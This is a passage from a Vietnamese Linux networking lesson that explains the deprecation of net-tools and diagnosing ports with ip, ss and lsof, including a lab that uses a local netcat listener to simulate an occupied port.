                  <span class="net-arch-layer-name">⚡ CHÂN KIỀNG 2: ss -tulpn (Tầng L4: Socket Statistics &amp; Bộ Đệm Hàng Đợi)</span>
                  <span class="net-arch-layer-badge">iproute2 / Netlink sock_diag</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Mục tiêu chẩn đoán:</strong> Cổng dịch vụ có mở không? (<code>LISTEN</code>), Có ai đang kết nối? (<code>ESTABLISHED</code>)</div>
                  <div class="net-arch-node"><strong>Chỉ số nhạy cảm:</strong> <code>Recv-Q</code> (Accept Queue tràn?), <code>Send-Q</code> (Nghẽn mạng?), TCP Metrics (<code>rtt</code>, <code>cwnd</code>)</div>
                  <div class="net-arch-node"><strong>Cơ chế Kernel:</strong> <code>sock_diag</code> Netlink subsystem (đọc thẳng RAM không qua procfs text parser)</div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Ánh xạ Socket Inode vào File Descriptor của Không gian Tiến trình</div>

              <div class="net-arch-layer layer-userspace">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">🔍 CHÂN KIỀNG 3: lsof -nP -i (Tầng L7 / System: Process &amp; File Descriptor Mapping)</span>
                  <span class="net-arch-layer-badge">VFS /proc/&lt;PID&gt;/fd</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Mục tiêu chẩn đoán:</strong> Tiến trình nào đang "ngậm" cổng này? (Truy tìm hung thủ gây lỗi Address already in use)</div>
                  <div class="net-arch-node"><strong>Thông số chủ chốt:</strong> PID, Process Name, User sở hữu, Số File Descriptor (FD), Inode ảo của socket</div>
                  <div class="net-arch-node"><strong>Quy tắc sinh tử:</strong> Bắt buộc dùng cờ <code>-n</code> (No DNS) và <code>-P</code> (No Port Name) để chống treo terminal</div>
                </div>
              </div>
            </div>
          </div>`
      },
      sections: [
        {
          id: "sec-problem",
          title: "Vấn đề thực tế: Tại sao ifconfig và netstat bị khai tử sau hơn 20 năm?",
          content: `<p>Nếu bạn tìm kiếm các hướng dẫn mạng trên Internet hoặc đọc các tài liệu viết từ thập niên 2000, bạn sẽ thấy ngập tràn những câu lệnh quen thuộc: <code>ifconfig</code>, <code>netstat -tulpn</code>, <code>route -n</code>, <code>arp -a</code>. Đây là các thành phần thuộc gói phần mềm <strong>net-tools</strong> cổ điển.</p>
        <p>Tuy nhiên, vào năm 2009, nhóm phát triển nhân Linux và các bản phân phối lớn (Debian, RedHat, Ubuntu, Arch, Alpine) đã đồng loạt tuyên bố: <strong>Khai tử (Deprecate) hoàn toàn bộ công cụ net-tools</strong> và thay thế bằng bộ công cụ <strong>iproute2</strong> (với các lệnh trung tâm là <code>ip</code> và <code>ss</code>).</p>
        <p>Tại sao một bộ công cụ đã gắn bó với hàng triệu kỹ sư suốt 20 năm lại bị loại bỏ không thương tiếc? Căn nguyên nằm ở 3 khiếm khuyết kiến trúc chí mạng mà net-tools không thể khắc phục:</p>

        <div class="net-topo-box">
          <div class="net-topo-title">💀 3 LÝ DO KHIẾN NET-TOOLS BỊ KHAI TỬ</div>
          <ol style="margin:0;padding-left:20px;line-height:1.7;">
            <li><strong>Lỗi thời về Syscall (ioctl vs Netlink):</strong> <code>ifconfig</code> giao tiếp với Kernel qua các lời gọi hệ thống <code>ioctl()</code> kiểu cũ. Mỗi lần truy vấn thông số, Kernel phải thực hiện một lệnh đồng bộ (blocking). Trong khi đó, <code>iproute2</code> sử dụng giao thức <strong>Netlink Sockets</strong>: một cơ chế IPC nhị phân hai chiều hiện đại, bất đồng bộ, hỗ trợ truyền tải cấu trúc dữ liệu theo khối (TLVs) và không bao giờ làm nghẽn tiến trình.</li>
            <li><strong>Bất lực trước các tính năng Linux hiện đại:</strong> <code>ifconfig</code> không hiểu được <strong>Network Namespaces</strong> (nền tảng của Docker và Kubernetes). Nó không hỗ trợ Policy Routing đa bảng, không quản lý được VLAN 802.1Q, Bridge hiện đại, VXLAN, WireGuard hay Traffic Control (<code>tc</code>). Nghiêm trọng hơn, <code>ifconfig</code> không thể gán nhiều địa chỉ IP trên một card mạng đúng chuẩn mà phải dùng cơ chế bí danh giả tạo (Aliasing: <code>eth0:0</code>, <code>eth0:1</code>) — một cơ chế cực kỳ nguy hiểm có thể xóa nhầm IP chính khi gỡ IP phụ!</li>
            <li><strong>Nghẽn cổ chai CPU khi đọc bảng trạng thái (netstat vs ss):</strong> Như chúng ta đã mổ xẻ ở Bài 0.3, <code>netstat</code> đọc dữ liệu bằng cách phân tích chuỗi văn bản ASCII từ <code>/proc/net/tcp</code>. Trên các máy chủ gánh 200.000 kết nối, <code>netstat</code> khiến Kernel phải lock toàn bộ bảng băm socket trong RAM, làm treo máy chủ trong nhiều giây. Ngược lại, <code>ss</code> dùng Netlink <code>sock_diag</code> để đọc ảnh chụp RCU (Read-Copy-Update) nhị phân siêu tốc trong vài phần nghìn giây!</li>
          </ol>
        </div>

        <p>Là một kỹ sư hiện đại, việc tiếp tục gõ <code>ifconfig</code> hay <code>netstat</code> không chỉ thể hiện sự lạc hậu về công nghệ, mà còn tiềm ẩn nguy cơ làm sập các hệ thống tải cao trên môi trường Production. Hãy xóa bỏ chúng khỏi thói quen và làm chủ bộ ba quyền lực: <strong><code>ip -br a</code></strong>, <strong><code>ss -tulpn</code></strong>, và <strong><code>lsof -nP -i</code></strong>!</p>`
        },
        {
          id: "sec-pillar-ip",
          title: "Chân kiềng 1: ip -br a & Quản lý Interface, Địa chỉ IP chuẩn hiện đại",
          content: `<p>Khi bạn cần kiểm tra nhanh toàn bộ hạ tầng mạng trên máy chủ: có bao nhiêu card mạng, card nào đang cắm cáp, và mỗi card đang mang địa chỉ IP nào, lệnh đầu tiên bạn nên gõ là:</p>
        <pre class="code-pre"><code>ip -br a</code></pre>
        <p>Cờ <code>-br</code> là viết tắt của <strong><code>-brief</code></strong> (ngắn gọn, súc tích), và <code>a</code> là viết tắt của <strong><code>address show</code></strong>. Kết quả trả về là một bảng tóm tắt hoàn mỹ chỉ vỏn vẹn vài dòng, hiển thị trực diện những gì kỹ sư quan tâm nhất mà không bị "rác" terminal như lệnh <code>ip a</code> thông thường:</p>

        <div class="net-log-terminal" style="font-size:0.82rem;white-space:pre;">lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0             UP             192.168.1.105/24 fe80::5054:ff:fe8a:bc11/64 
docker0          DOWN           172.17.0.1/16 </div>

        <h3 style="margin-top:20px;color:var(--topic-network);">Giải phẫu Ý nghĩa Trạng thái: UP vs LOWER_UP</h3>
        <p>Khi xem chi tiết một giao diện mạng bằng lệnh <code>ip link show eth0</code>, bạn sẽ bắt gặp dòng cờ trạng thái sau:</p>
        <pre class="code-pre"><code>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT ...</code></pre>
        <p>Hãy chú ý sự khác biệt cực kỳ tinh tế giữa hai cờ <strong><code>UP</code></strong> và <strong><code>LOWER_UP</code></strong>:</p>
        <ul>
          <li><strong>Cờ <code>UP</code> (Administrative State):</strong> Đại diện cho <em>ý muốn chủ quan của Quản trị viên</em>. Khi bạn gõ <code>sudo ip link set eth0 up</code>, cờ này được bật lên, báo hiệu cho Kernel biết rằng bạn cho phép giao diện này hoạt động.</li>
          <li><strong>Cờ <code>LOWER_UP</code> (Physical Link State):</strong> Đại diện cho <em>tín hiệu vật lý thực tế của Lớp 1 (L1 Carrier)</em>. Cờ này chỉ xuất hiện khi cáp mạng thực sự đã cắm chặt vào cổng switch và chip mạng nhận được xung điện/tín hiệu quang (tương đương với <code>cat /sys/class/net/eth0/carrier</code> trả về <code>1</code>).</li>
        </ul>

        <div class="net-topo-box">
          <div class="net-topo-title">⚠️ BẪY SỰ CỐ: KHI NÀO INTERFACE BÁO "NO-CARRIER"?</div>
          <p>Nếu bạn thấy trạng thái ghi: <code>&lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; state DOWN</code>:</p>
          <p>Điều này có nghĩa là quản trị viên đã bật giao diện (có cờ <code>UP</code>), nhưng <strong>dây cáp mạng chưa được cắm hoặc switch bị hỏng</strong> (thiếu cờ <code>LOWER_UP</code>)! Bạn không cần mất công cấu hình lại địa chỉ IP hay restart network service, mà hãy chạy ngay tới tủ rack kiểm tra sợi dây cáp vật lý.</p>
        </div>

        <h3 style="margin-top:20px;color:var(--topic-network);">Quản lý Nhiều Địa chỉ IP (Secondary IPs) Chuẩn Hiện Đại</h3>
        <p>Trong kiến trúc hiện đại, một card mạng vật lý có thể gánh hàng chục địa chỉ IP khác nhau (rất phổ biến khi cấu hình Web Server đa domain hoặc dịch vụ Failover Keepalived/VIP):</p>
        <ul>
          <li><strong>Thêm IP phụ:</strong> <code>sudo ip addr add 192.168.1.200/24 dev eth0</code> (Kernel tự động gắn IP phụ vào interface mà không cần tạo alias giả <code>eth0:1</code>).</li>
          <li><strong>Gỡ bỏ IP:</strong> <code>sudo ip addr del 192.168.1.200/24 dev eth0</code>.</li>
          <li><strong>Kiểm tra thống kê lỗi gói tin:</strong> <code>ip -s link show eth0</code> (in ra số gói Rx/Tx, lỗi CRC, và gói bị rụng).</li>
        </ul>`
        },
        {
          id: "sec-pillar-ss",
          title: "Chân kiềng 2: ss -tulpn & Vũ khí tối thượng soi Socket tầng L4",
          content: `<p>Khi bạn cần biết: <em>"Server của tôi đang mở những cổng nào? Tiến trình nào đang lắng nghe? Và các kết nối TCP có đang bị nghẽn dữ liệu không?"</em>, câu lệnh quyền lực nhất trên Linux là:</p>
        <pre class="code-pre"><code>sudo ss -tulpn</code></pre>

        <h3 style="margin-top:16px;color:var(--topic-network);">Giải phẫu Bộ Cờ Thần Thánh: -tulpn</h3>
        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Cờ lệnh</th>
                <th>Tên đầy đủ</th>
                <th>Tác dụng kỹ thuật thực tế</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td class="net-highlight-cell"><code>-t</code></td>
                <td>TCP</td>
                <td>Chỉ hiển thị các socket thuộc giao thức truyền vận TCP (Transmission Control Protocol).</td>
              </tr>
              <tr>
                <td class="net-highlight-cell"><code>-u</code></td>
                <td>UDP</td>
                <td>Chỉ hiển thị các socket thuộc giao thức UDP (User Datagram Protocol - như DNS, DHCP, WireGuard).</td>
              </tr>
              <tr>
                <td class="net-highlight-cell"><code>-l</code></td>
                <td>Listening</td>
                <td><strong>Chỉ lọc các socket đang ở trạng thái LISTEN</strong> (cổng dịch vụ mở chờ đón khách). Nếu bỏ cờ <code>-l</code>, lệnh sẽ chỉ hiển thị các kết nối đang hoạt động (ESTABLISHED).</td>
              </tr>
              <tr>
                <td class="net-highlight-cell"><code>-p</code></td>
                <td>Processes</td>
                <td>Hiển thị tên tiến trình, mã PID và số File Descriptor (FD) sở hữu socket. <em>Lưu ý: Bắt buộc phải có quyền root (sudo) mới xem được tiến trình của user khác!</em></td>
              </tr>
              <tr>
                <td class="net-highlight-cell"><code>-n</code></td>
                <td>Numeric</td>
                <td><strong>QUY TẮC SỐNG CÒN:</strong> Không phân giải tên miền (DNS) và không dịch số cổng thành tên service. Lệnh chạy tức thì trong 1 mili-giây, không bao giờ bị đơ vì DNS timeout.</td>
              </tr>
            </tbody>
          </table>
        </div>

        <h3 style="margin-top:24px;color:var(--topic-network);">Bí Ẩn Cột Recv-Q và Send-Q: Hai Khuôn Mặt Giữa LISTEN và ESTABLISHED</h3>
        <p>Đây là một trong những câu hỏi phỏng vấn hóc búa nhất nhằm phân biệt giữa kỹ sư học vẹt và kỹ sư nắm vững bản chất Linux Kernel:</p>
        <p><strong>Cột Recv-Q và Send-Q trong lệnh ss có ý nghĩa gì?</strong> Câu trả lời phụ thuộc hoàn toàn vào <em>Trạng thái của Socket</em>:</p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Trạng thái Socket</th>
                <th>Ý nghĩa cột Recv-Q</th>
                <th>Ý nghĩa cột Send-Q</th>
                <th>Dấu hiệu Báo Động Đỏ (Alert)</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td class="net-highlight-cell"><strong>LISTEN (Cổng mở)</strong><br><code>ss -tulpn</code></td>
                <td>Số lượng kết nối đã hoàn tất bắt tay 3 bước đang nằm chờ trong <strong>Accept Queue</strong> nhưng ứng dụng chưa kịp gọi hàm <code>accept()</code> để lấy ra.</td>
                <td>Kích thước tối đa của Accept Queue (được thiết lập qua tham số <code>backlog</code> trong syscall <code>listen(fd, backlog)</code> và sysctl <code>net.core.somaxconn</code>).</td>
                <td><strong style="color:var(--danger);">Recv-Q &gt; 0 và tiệm cận Send-Q!</strong><br>Ứng dụng bị quá tải hoặc bị treo (event loop blocked), không kịp nhận khách mới. Các client mới sẽ bị Drop kết nối hoặc timeout!</td>
              </tr>
              <tr>
                <td><strong>ESTABLISHED (Đang truyền nhận)</strong><br><code>ss -tupn</code></td>
                <td>Số byte dữ liệu đã được card mạng nhận vào Kernel buffer nhưng ứng dụng phía ta <strong>chưa gọi hàm read()</strong> để xử lý.</td>
                <td>Số byte dữ liệu mà ứng dụng đã ghi vào Kernel buffer nhưng <strong>chưa nhận được gói ACK</strong> từ máy chủ phía đối diện.</td>
                <td><strong style="color:var(--danger);">Send-Q tăng cao liên tục:</strong><br>Đường truyền mạng bị nghẽn, hoặc máy chủ đầu xa bị đơ không kịp ACK.<br><strong style="color:var(--danger);">Recv-Q tăng cao liên tục:</strong><br>Ứng dụng nội bộ bị chậm, đọc không kịp tốc độ bơm dữ liệu của client.</td>
              </tr>
            </tbody>
          </table>
        </div>

        <h3 style="margin-top:24px;color:var(--topic-network);">Sức Mạnh của Bộ Lọc Biểu Thức (Socket Filters) Trong ss</h3>
        <p>Khác với <code>netstat</code> phải dùng <code>grep</code> cồng kềnh, <code>ss</code> tích hợp sẵn bộ máy lọc biểu thức trực tiếp từ tầng Kernel:</p>
        <ul>
          <li>Lọc theo trạng thái kết nối: <code>ss -t state time-wait</code> hoặc <code>ss -t state established</code>.</li>
          <li>Lọc theo cổng nguồn hoặc cổng đích: <code>ss -nt '( sport = :80 or sport = :443 )'</code>.</li>
          <li>Lọc theo dải địa chỉ mạng: <code>ss -nt 'dst 10.0.0.0/8'</code>.</li>
          <li>Soi sâu các thông số vi mô TCP: <code>ss -ti '( sport = :443 )'</code> (in ra RTT, kích thước cửa sổ trượt <code>cwnd</code>, số gói retransmit).</li>
        </ul>`
        },
        {
          id: "sec-pillar-lsof",
          title: "Chân kiềng 3: lsof -i & Thợ săn tiến trình và File Descriptor",
          content: `<p>Lệnh <code>ss</code> cho bạn biết góc nhìn từ tầng mạng (Transport Layer). Nhưng khi bạn gặp lỗi kinh điển:</p>
        <pre class="code-pre"><code>Error: listen tcp :8080: bind: address already in use</code></pre>
        <p>Và bạn cần câu trả lời tức thì: <em>"Chính xác tiến trình nào đang chiếm giữ cổng 8080? Nó chạy file thực thi ở đâu? User nào khởi chạy nó?"</em>, thì <strong><code>lsof -i</code></strong> chính là công cụ truy bắt tội phạm số 1!</p>

        <h3 style="margin-top:16px;color:var(--topic-network);">Bản chất: lsof = List Open Files</h3>
        <p>Như chúng ta đã chứng minh bằng thực nghiệm tại Bài 0.1: Trên Linux, <strong>mọi Socket mạng đều là một File Descriptor (FD)</strong> liên kết với một Inode ảo trên <code>sockfs</code>. Vì vậy, công cụ liệt kê tệp mở <code>lsof</code> có thể "nhìn xuyên" qua bảng File Descriptor của mọi tiến trình trong <code>/proc/&lt;PID&gt;/fd/</code> để tóm gọn mọi kết nối mạng!</p>

        <div class="net-log-terminal" style="font-size:0.82rem;white-space:pre;">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nginx    1204     root    6u  IPv4  289145      0t0  TCP *:80 (LISTEN)
nginx    1205 www-data    6u  IPv4  289145      0t0  TCP *:80 (LISTEN)
python3  4892  student    3u  IPv4  312048      0t0  TCP 127.0.0.1:8080 (LISTEN)</div>

        <h3 style="margin-top:20px;color:var(--topic-network);">Quy Tắc Sinh Tử: Luôn Luôn Dùng lsof Kèm Cờ -n và -P</h3>
        <p>Nếu bạn chỉ gõ <code>lsof -i</code> trần trụi trên một máy chủ đang gặp sự cố mạng, bạn có thể tự tay làm <strong>treo cứng toàn bộ phiên làm việc của mình trong hàng chục phút!</strong></p>
        <p>Vì sao lại nguy hiểm như vậy? Mặc định:</p>
        <ul>
          <li><code>lsof</code> cố gắng gửi truy vấn Reverse DNS cho từng địa chỉ IP của hàng chục ngàn socket kết nối. Nếu máy chủ DNS nội bộ đang bị nghẽn hoặc chết, mỗi yêu cầu sẽ bị timeout từ 5 đến 30 giây!</li>
          <li><code>lsof</code> cố gắng tra cứu tệp <code>/etc/services</code> để dịch các số cổng thành tên dịch vụ bằng chữ.</li>
        </ul>

        <div class="net-topo-box">
          <div class="net-topo-title">🛡️ QUY TẮC BẢO VỆ SRE: GẮN CHẶT -n VÀ -P VÀO TÂM TRÍ</div>
          <p>Bất kỳ khi nào sử dụng <code>lsof</code> để điều tra mạng, hãy luôn gõ: <strong><code>lsof -nP -i</code></strong>:</p>
          <ul style="margin:4px 0 6px 16px;">
            <li><code>-n</code> (No Host Names): Cấm tuyệt đối việc phân giải tên miền DNS.</li>
            <li><code>-P</code> (No Port Names): Hiển thị cổng dưới dạng số nguyên thuần túy (ví dụ <code>:80</code> thay vì <code>:http</code>, <code>:3306</code> thay vì <code>:mysql</code>).</li>
          </ul>
        </div>

        <h3 style="margin-top:20px;color:var(--topic-network);">Các Cú Pháp Thực Chiến Tiêu Biểu của lsof</h3>
        <ul>
          <li>Tìm tiến trình chiếm một cổng cụ thể: <code>sudo lsof -nP -i :8080</code>.</li>
          <li>Chỉ tìm các socket đang lắng nghe: <code>sudo lsof -nP -i TCP -sTCP:LISTEN</code>.</li>
          <li>Tìm tất cả kết nối mạng của một tiến trình theo PID: <code>sudo lsof -nP -i -a -p 1204</code> (cờ <code>-a</code> kết hợp điều kiện AND).</li>
          <li>Tìm kết nối tới một máy chủ cụ thể: <code>sudo lsof -nP -i @192.168.1.1</code>.</li>
        </ul>`
        },
        {
          id: "sec-matrix",
          title: "Ma trận đối chiếu: Khi nào dùng công cụ nào & Bảng quy đổi net-tools sang iproute2",
          content: `<p>Để tối ưu hóa thời gian xử lý sự cố trong môi trường áp lực cao, một kỹ sư chuyên nghiệp cần phản xạ chính xác: <em>Tình huống này cần rút công cụ nào trong bao kiếm?</em></p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Tiêu chí đánh giá</th>
                <th><code>ip -br a</code></th>
                <th class="net-highlight-cell"><code>ss -tulpn</code></th>
                <th><code>lsof -nP -i</code></th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Tầng mạng trọng tâm</strong></td>
                <td>Tầng 1 - Tầng 3 (Physical Link, MAC, IP)</td>
                <td class="net-highlight-cell">Tầng 4 (TCP, UDP, Sockets)</td>
                <td>Tầng 7 &amp; Process VFS (Process, FD, Inode)</td>
              </tr>
              <tr>
                <td><strong>Tốc độ thực thi</strong></td>
                <td>⚡ Cực nhanh (&lt; 1ms qua Netlink)</td>
                <td class="net-highlight-cell">⚡ Nhanh nhất hệ thống (&lt; 2ms qua sock_diag)</td>
                <td>🐢 Trung bình (phải duyệt cây /proc)</td>
              </tr>
              <tr>
                <td><strong>Hiển thị hàng đợi Recv/Send</strong></td>
                <td>Không</td>
                <td class="net-highlight-cell"><strong>Rất chi tiết</strong> (Phát hiện nghẽn Accept Queue)</td>
                <td>Không</td>
              </tr>
              <tr>
                <td><strong>Hiển thị chi tiết Process</strong></td>
                <td>Không</td>
                <td class="net-highlight-cell">Có (PID, tên tiến trình, FD)</td>
                <td><strong>Đầy đủ nhất</strong> (PID, User, Path, Mode r/w)</td>
              </tr>
              <tr>
                <td><strong>Tình huống sử dụng tối ưu</strong></td>
                <td>Kiểm tra xem máy có mạng không, cáp có cắm không, IP là gì.</td>
                <td class="net-highlight-cell">Kiểm tra cổng dịch vụ, giám sát số lượng kết nối, đo RTT.</td>
                <td>Cần tìm chính xác PID để kill khi bị lỗi chiếm cổng mạng.</td>
              </tr>
            </tbody>
          </table>
        </div>

        <h3 style="margin-top:24px;color:var(--topic-network);">Bảng Tra Cứu: Từ Điển Chuyển Đổi từ net-tools sang iproute2</h3>
        <p>Nếu bạn vẫn còn vương vấn các lệnh cũ, hãy dán bảng chuyển đổi chuẩn quốc tế này ngay trước bàn làm việc:</p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Mục đích thao tác</th>
                <th>Lệnh cũ thời xưa (net-tools - ĐÃ KHAI TỬ)</th>
                <th class="net-highlight-cell">Lệnh hiện đại chuẩn Production (iproute2)</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Xem danh sách địa chỉ IP</td>
                <td><code>ifconfig -a</code></td>
                <td class="net-highlight-cell"><code>ip -br a</code> (hoặc <code>ip addr show</code>)</td>
              </tr>
              <tr>
                <td>Bật / Tắt card mạng</td>
                <td><code>ifconfig eth0 up / down</code></td>
                <td class="net-highlight-cell"><code>ip link set eth0 up / down</code></td>
              </tr>
              <tr>
                <td>Gán địa chỉ IP cho card</td>
                <td><code>ifconfig eth0 192.168.1.10/24</code></td>
                <td class="net-highlight-cell"><code>ip addr add 192.168.1.10/24 dev eth0</code></td>
              </tr>
              <tr>
                <td>Xem bảng định tuyến (Routing)</td>
                <td><code>route -n</code> hoặc <code>netstat -r</code></td>
                <td class="net-highlight-cell"><code>ip route show</code> (hoặc <code>ip r</code>)</td>
              </tr>
              <tr>
                <td>Xem bảng phân giải ARP</td>
                <td><code>arp -an</code></td>
                <td class="net-highlight-cell"><code>ip neigh show</code> (hoặc <code>ip n</code>)</td>
              </tr>
              <tr>
                <td>Xem các cổng TCP đang mở</td>
                <td><code>netstat -tulpn</code></td>
                <td class="net-highlight-cell"><code>ss -tulpn</code></td>
              </tr>
              <tr>
                <td>Xem thống kê lưu lượng lỗi</td>
                <td><code>netstat -i</code></td>
                <td class="net-highlight-cell"><code>ip -s link show eth0</code></td>
              </tr>
            </tbody>
          </table>
        </div>`
        },
        {
          id: "sec-observe",
          title: "Quan sát trên Linux: Thực thi lệnh và Phân tích từng dòng Output",
          content: `<p>Hãy cùng mở terminal Linux và thực hiện chuỗi lệnh chẩn đoán tam giác quyền lực để quan sát output thực tế:</p>`,
          codeExamples: [
            {
              title: "Khảo sát nhanh toàn bộ Card mạng với ip -br a và ip -s link",
              lang: "Bash",
              code: "# 1. Hiển thị tóm tắt trạng thái và IP của toàn bộ interface\nip -br a\n\n# 2. Xem chi tiết bộ đếm thống kê gói tin và lỗi của interface eth0\nip -s link show eth0",
              output: "lo               UNKNOWN        127.0.0.1/8 ::1/128 \neth0             UP             192.168.1.105/24 fe80::5054:ff:fe8a:bc11/64 \n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n    link/ether 52:54:00:8a:bc:11 brd ff:ff:ff:ff:ff:ff\n    RX:  bytes packets errors dropped missed mcast   \n      9548120   64210      0       0      0     0   \n    TX:  bytes packets errors dropped carrier collsns \n      3142980   41029      0       0       0       0",
              annotations: [
                { line: 2, text: "ip -br a cung cấp bảng 3 cột gọn gàng: Tên card, Trạng thái (UP/DOWN), và Dải IP CIDR." },
                { line: 5, text: "ip -s link in ra chi tiết các bộ đếm RX (Nhận) và TX (Gửi)." },
                { line: 8, text: "errors = 0 và dropped = 0 xác nhận đường truyền mạng vật lý hoàn toàn khỏe mạnh." }
              ]
            },
            {
              title: "Soi cổng dịch vụ và bộ đệm với ss -tulpne",
              lang: "Bash",
              code: "# Liệt kê các cổng TCP và UDP đang mở kèm Inode và Process info\nsudo ss -tulpne | grep -E 'State|8080|22'",
              output: "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                                                        \ntcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:((\"sshd\",pid=845,fd=3)) ino:21045 sk:1 <->\ntcp   LISTEN 0      5          127.0.0.1:8080      0.0.0.0:*    users:((\"python3\",pid=4892,fd=3)) ino:312048 sk:2 <->",
              annotations: [
                { line: 2, text: "Cờ -e hiển thị số Inode (ino:312048), cờ -p hiển thị Process (python3, pid=4892, fd=3)." },
                { line: 3, text: "sshd đang nghe trên cổng 22 với Send-Q=128 (độ dài hàng đợi Accept backlog tối đa là 128)." },
                { line: 4, text: "python3 mở cổng 8080 với Send-Q=5 (backlog mặc định của http.server)." }
              ]
            },
            {
              title: "Truy vết tận gốc tiến trình chiếm cổng bằng lsof -nP -i",
              lang: "Bash",
              code: "# Tìm chính xác tiến trình đang giữ cổng 8080 (Bắt buộc dùng -n và -P)\nsudo lsof -nP -i :8080",
              output: "COMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npython3  4892 student    3u  IPv4 312048      0t0  TCP 127.0.0.1:8080 (LISTEN)",
              annotations: [
                { line: 2, text: "Cú pháp :8080 chỉ định đích danh cổng cần điều tra." },
                { line: 3, text: "Cột FD hiển thị '3u' (Descriptor số 3, chế độ u: read/write), NODE là Inode 312048 khớp tuyệt đối với ss!" }
              ]
            }
          ]
        },
        {
          id: "sec-lab",
          title: "Phòng Lab thực hành: Điều tra và Giải cứu Cổng mạng bị chiếm giữ",
          content: `<div class="net-topo-box">
          <div class="net-topo-title">🧪 PHÒNG LAB THỰC HÀNH 0.4: GIẢI CỨU CỔNG MẠNG BỊ CHIẾM GIỮ</div>
          <p><strong>Kịch bản sự cố:</strong> Bạn chuẩn bị triển khai một microservice quan trọng trên cổng <code>7070</code>. Khi khởi chạy, dịch vụ vấp phải lỗi: <code>Address already in use</code>. Bạn cần dùng bộ ba <code>ip -br a</code>, <code>ss -tulpn</code> và <code>lsof -nP -i</code> để tìm ra thủ phạm đang chiếm cổng, phân tích trạng thái bộ đệm, và giải phóng cổng mạng an toàn.</p>
          <p><strong>Yêu cầu môi trường:</strong> Terminal Linux thông thường (Ubuntu/Debian/CentOS/WSL2).</p>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 1</span>
            <h4 class="net-step-title">Khảo sát hạ tầng Interface mạng hiện hành</h4>
          </div>
          <p class="net-step-desc">Chạy lệnh <code>ip -br a</code> để xác định chính xác địa chỉ IP của máy và kiểm tra xem interface loopback <code>lo</code> có hoạt động không:</p>
          <pre class="code-pre"><code>ip -br a</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Xác nhận:</strong> Giao diện <code>lo</code> phải có IP <code>127.0.0.1/8</code> và trạng thái <code>UNKNOWN</code> (đây là trạng thái chuẩn của loopback). Card mạng chính có trạng thái <code>UP</code>.</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 2</span>
            <h4 class="net-step-title">Giả lập một tiến trình "ngầm" chiếm đoạt cổng 7070</h4>
          </div>
          <p class="net-step-desc">Khởi chạy một tiến trình netcat chạy ngầm trong background giả làm tiến trình ma đang chiếm giữ cổng 7070:</p>
          <pre class="code-pre"><code>nc -l -k 127.0.0.1 7070 &gt; /dev/null 2&gt;&amp;1 &amp;
ROGUE_PID=$!
echo "Tiến trình ma vừa chiếm cổng với PID: $ROGUE_PID"</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Hiện tượng:</strong> Một tiến trình chạy nền đã được kích hoạt. Hãy thử chạy một Web Server trên cùng cổng này để thấy lỗi: <code>python3 -m http.server 7070</code> ➔ Bị từ chối ngay với <code>Errno 98: Address already in use</code>!</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 3</span>
            <h4 class="net-step-title">Dùng ss -tulpn để phát hiện cổng bị chiếm và đọc số Inode</h4>
          </div>
          <p class="net-step-desc">Dùng lệnh <code>ss</code> kết hợp cờ <code>-e</code> và bộ lọc để xác định xem cổng 7070 có thực sự đang mở không:</p>
          <pre class="code-pre"><code>sudo ss -tulpne '( sport = :7070 )'</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Kết quả mong đợi:</strong> Lệnh in ra một dòng chứa <code>127.0.0.1:7070</code>, trạng thái <code>LISTEN</code>, và ghi nhận rõ mã <code>ino:XXXXXX</code> cùng tên tiến trình <code>nc</code>.</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 4</span>
            <h4 class="net-step-title">Dùng lsof -nP -i để xác định chính xác PID và User</h4>
          </div>
          <p class="net-step-desc">Sử dụng <code>lsof</code> kèm cờ bảo vệ <code>-nP</code> để lấy chính xác mã PID của tiến trình cần xử lý:</p>
          <pre class="code-pre"><code>sudo lsof -nP -i :7070</code></pre>
          <p class="net-step-desc" style="margin-top:8px;">Trích xuất tự động PID để chuẩn bị tiêu diệt:</p>
          <pre class="code-pre"><code>TARGET_PID=$(sudo lsof -t -i :7070)
echo "PID cần xử lý triệt để: $TARGET_PID"</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Mẹo thực chiến:</strong> Cờ <code>-t</code> (terse) của <code>lsof</code> chỉ in ra duy nhất con số PID, cực kỳ hoàn hảo để đưa vào các shell script tự động hóa!</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 5</span>
            <h4 class="net-step-title">Tiêu diệt tiến trình chiếm cổng và Kiểm chứng giải phóng</h4>
          </div>
